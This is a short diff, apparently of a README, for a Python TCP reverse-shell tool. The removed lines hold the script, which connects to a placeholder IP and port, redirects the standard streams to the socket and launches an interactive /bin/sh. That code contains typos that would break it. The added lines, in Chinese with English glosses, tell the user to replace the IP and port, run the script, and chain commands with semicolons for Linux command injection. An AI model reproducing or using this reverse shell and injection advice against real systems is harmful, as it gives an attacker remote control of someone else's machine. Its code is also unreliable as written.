@@ -1,10 +1,10 @@
-# python-shell-tcp
-import subpreocess,os,socket
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-#替换ip和port(Replace IP and port)
-s.connect(('ip'),port)
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh/","-i"])
 
+开始（start）：
+替换ip和port（替换IP和端口）
+
+python：
+python shell.py
+
+linux：
+命令执行→每个语句尾加；再连成一句
+命令执行→在每个语句的末尾添加；然后连成一句话
